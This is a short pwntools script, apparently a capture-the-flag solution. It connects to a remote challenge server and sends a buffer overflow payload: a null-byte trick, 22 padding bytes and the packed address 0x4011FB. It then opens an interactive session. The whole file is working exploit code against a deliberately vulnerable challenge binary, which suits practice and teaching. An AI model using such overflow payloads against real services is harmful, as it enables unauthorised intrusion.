from pwn import *

#p = process('./chall')
p = remote("34.48.173.44", 5000)

payload = b"A\x00" + b"A" * 22 + p64(0x4011FB)
p.sendlineafter(b": ", payload)

p.interactive()